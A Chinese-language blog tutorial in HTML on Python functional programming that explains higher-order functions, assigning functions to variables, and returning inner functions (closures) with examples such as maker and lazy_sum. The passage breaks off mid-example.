        <content type="html"><![CDATA[<p>装饰器还没搞懂，搞懂了再来继续写吧~<br>函数既可作为返回值也可作为函数的参数…一切都是对象，一切都是指针，一切都是东西…<br>返回函数（引用）和返回函数值是不一样滴….  ◡̈⃝︎⋆︎* </p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">函数式编程</font> </center><br><br><br><center><font face="Comic sans MS">**函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！**</font> </center><br><br><h3 id="一-高阶函数"><font color="#FF6347" face="Comic sans MS">一. 高阶函数</font><a href="post/Python-FunctionalProgramming#一-高阶函数"></a></h3><br><blockquote><ol><li><font color="#FF7F00"><strong>变量可以指向函数</strong></font>；</li><li><font color="#FF7F00"><strong>函数名也是变量</strong></font>；</li><li><font color="#FF7F00"><strong>函数可以作为return的返回值</strong></font>；</li><li><font color="#FF7F00"><strong>函数可以作为另一个函数的参数</strong></font>。</li></ol></blockquote><br><h4 id="1-1-变量指向函数"><font color="#3CB371" face="Comic sans MS">1.1 变量指向函数</font><a href="post/Python-FunctionalProgramming#1-1-变量指向函数"></a></h4><br><p>&emsp;&emsp; <font face="Microsoft YaHei">在讲变量和字符串的时候我们讲过，变量就是一个对象，可以当作一个指针使用，而函数名也是一个变量，也就是一个对象。函数名其实就是指向函数的变量！注意，函数名是一个变量！变量！变量！当作指针用。</font></p><p>&emsp;&emsp; <font face="Sans-serif">既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。<br></font></p><br><hr><hr><p><font color="red" face="Comic sans MS"><strong>见过两种函数赋值给变量的形式</strong></font><font face="Comic sans MS">，这两种形式是有区别的，分别总结一下。</font><br>一种是</p><p><strong><code>a = f</code></strong></p><p>另一种是</p><p><strong><code>a = f()</code></strong></p><p><font color="red"><strong>1.</strong> <strong><code>a = f</code></strong> <strong>型属于将变量指向函数。</strong></font></p><p>如下用示例说明：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>abs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>abs<span class="token punctuation">)</span>输出：<span class="token number">10</span><span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function abs<span class="token operator">></span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>  可见，abs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span>是函数调用，而abs是函数本身。要获得函数调用结果，我们可以把结果赋值给变量：  x <span class="token operator">=</span> abs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>输出：<span class="token number">10</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>但是，如果把函数本身赋值给变量呢？f <span class="token operator">=</span> abs<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>输出：<span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function abs<span class="token operator">></span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>结论：函数本身也可以赋值给变量，即：变量可以指向函数。如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：f <span class="token operator">=</span> abs<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>输出：<span class="token number">10</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>成功！说明变量f现在已经指向了abs函数本身。直接调用abs<span class="token punctuation">(</span><span class="token punctuation">)</span>函数和调用变量f<span class="token punctuation">(</span><span class="token punctuation">)</span>完全相同。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>说明变量f现在已经指向了abs函数本身。直接调用<code>abs()</code>函数和调用变量<code>f()</code>完全相同。这是廖雪峰老师python教程上的例子，现在调用<code>f()</code>和调用<code>abs()</code>是一样的了。</p><br><p>再举一个工厂函数的例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">maker</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>　　<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>X<span class="token punctuation">)</span><span class="token punctuation">:</span>　　　　<span class="token keyword">return</span> X<span class="token operator">**</span>N　　<span class="token keyword">return</span> action<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>这个嵌套函数的外层返回值为内层函数的函数名，注意没有括号，这里有无括号是有很大区别的。此时调用外部函数：f<span class="token operator">=</span>maker<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>   <span class="token operator">//</span>此时进入maker<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>，且定义了一个action<span class="token punctuation">(</span>X<span class="token punctuation">)</span>函数，然后返回action函数名（对象）给f<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>那么如上所述，f便指向了action函数，且限制条件为N<span class="token operator">=</span><span class="token number">2</span>，可以理解为f为N等于<span class="token number">2</span>时的action函数。我们来调用它：<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token operator">//</span>此时相当于调用了cation<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>函数，这也是在外部使用内部嵌套函数的方法，              <span class="token operator">//</span>因为内部嵌套函数是不允许在外部访问的。输出：<span class="token number">9</span>            <span class="token operator">//</span>证明f和action函数是一样的。<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>如上的示例也可以用<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token operator">=</span>maker<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>来输出结果一样，两个括号连在一起相当于执行了这两个函数。<span class="token keyword">def</span> <span class="token function">maker</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">a</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> c<span class="token operator">**</span>N     <span class="token keyword">return</span> af<span class="token operator">=</span>maker<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span> <span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font color="red"><strong>2.</strong> <strong><code>a = f()</code></strong> <strong>型属于将f()的返回值赋值给a的过程</strong></font></p><pre class="line-numbers language-python"><code class="language-python">这里的a仅仅接收f<span class="token punctuation">(</span><span class="token punctuation">)</span>的返回值，如果f<span class="token punctuation">(</span><span class="token punctuation">)</span>没有返回值，那么a即被赋值为None。这里值得注意的一点是，在a<span class="token operator">=</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span>的执行过程中，f<span class="token punctuation">(</span><span class="token punctuation">)</span>会运行一次，如：<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    z <span class="token operator">=</span> x<span class="token operator">+</span>y    <span class="token keyword">print</span><span class="token punctuation">(</span>z<span class="token punctuation">)</span>a <span class="token operator">=</span> add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'******我是分隔符，嘿嘿嘿******'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span> <span class="token number">7</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>我是分隔符，嘿嘿嘿<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>None<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>这里在分隔符前输出了<span class="token number">7</span>，说明赋值过程函数add执行了，然而a的值为None，且只能通过<span class="token keyword">print</span>语句才可以显示。这是因为add<span class="token punctuation">(</span><span class="token punctuation">)</span>函数没有<span class="token keyword">return</span>语句。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-2-传入函数与返回函数名"><font color="#3CB371" face="Comic sans MS">1.2 传入函数与返回函数名</font><a href="post/Python-FunctionalProgramming#1-2-传入函数与返回函数名"></a></h4><br><p><font color="#00B2EE" face="Comic sans MS"><strong>一、传入函数（把函数作为参数）</strong></font></p><p>&emsp;&emsp;既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。</p><p>一个最简单的高阶函数：</p><pre class="line-numbers language-pyhton"><code class="language-pyhton">def add(x, y, f):    return f(x) + f(y)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当我们调用<code>add(-5, 6, abs)</code>时，参数x，y和f分别接收-5，6和abs，根据函数定义，我们可以推导计算过程为：</p><pre class="line-numbers language-python"><code class="language-python">x <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">5</span>y <span class="token operator">=</span> <span class="token number">6</span>f <span class="token operator">=</span> absf<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token punctuation">(</span>y<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> abs<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">+</span> abs<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">></span> <span class="token number">11</span><span class="token keyword">return</span> <span class="token number">11</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用代码验证一下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> f<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> f<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>add<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> abs<span class="token punctuation">)</span><span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span> <span class="token number">11</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p><strong>总结：</strong>编写高阶函数，就是让函数的参数能够接收别的函数。<font color="#FF7F00"><strong>把函数作为参数传入，这样的函数称为高阶函数，函数式编程就是指这种高度抽象的编程范式</strong></font>。</p></blockquote><br><p><font color="#00B2EE" face="Comic sans MS"><strong>二、返回函数名（把函数名作为返回值）</strong></font></p><p>&emsp;&emsp;高阶函数除了可以接受函数作为参数外，还可以把函数名作为结果值返回。注意Python3<font color="#FF7F00"><strong>返回的是迭代器对象</strong></font>。</p><br><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''我们来实现一个可变参数的求和。通常情况下，求和的函数是这样定义的：'''</span><span class="token keyword">def</span> <span class="token function">calc_sum</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">'在函数的参数章节讲过，*传入元组，**传入字典'</span>    ax <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> args<span class="token punctuation">:</span>        ax <span class="token operator">=</span> ax <span class="token operator">+</span> n    <span class="token keyword">return</span> ax<span class="token triple-quoted-string string">'''但是，如果不需要立刻求和，而是在后面的代码中，根据需要再计算怎么办？可以不返回求和的结果，而是返回求和的函数：'''</span><span class="token keyword">def</span> <span class="token function">lazy_sum</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ax <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> args<span class="token punctuation">:</span>            ax <span class="token operator">=</span> ax <span class="token operator">+</span> n        <span class="token keyword">return</span> ax    <span class="token keyword">return</span> sum<span class="token triple-quoted-string string">'''当我们调用lazy_sum()时，返回的并不是求和结果，而是求和函数：'''</span>f <span class="token operator">=</span> lazy_sum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span> <span class="token operator">&lt;</span>function lazy_sum<span class="token punctuation">.</span><span class="token operator">&lt;</span>locals<span class="token operator">></span><span class="token punctuation">.</span>sum at <span class="token number">0x101c6ed90</span><span class="token operator">></span><span class="token triple-quoted-string string">'''调用函数f时，才真正计算求和的结果：'''</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span>OUTPUT<span class="token punctuation">:</span> <span class="token number">25</span><span class="token 